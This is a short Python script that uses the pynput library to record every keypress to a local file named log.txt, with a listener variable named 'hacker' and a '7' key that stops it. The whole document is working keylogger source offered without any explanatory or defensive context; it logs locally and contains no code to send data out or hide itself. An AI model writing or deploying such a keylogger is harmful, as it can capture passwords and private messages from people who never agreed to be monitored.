from pynput.keyboard import Listener

def anonymous(key):
	key = str(key)
	key = key.replace("'","")

	if key=="7":
		raise SystemExit(0)
	if key== "Key.ctrl_l":
		key = ""
	if key== "Key.enter":
		key = "\n"
	if key== "Key.tab":
		key = "\n"
	if key== "Key.alt_l":
		key = "\n"

	with open("log.txt", "a") as file:
		file.write(key)


with Listener(on_press=anonymous) as hacker:
	hacker.join()

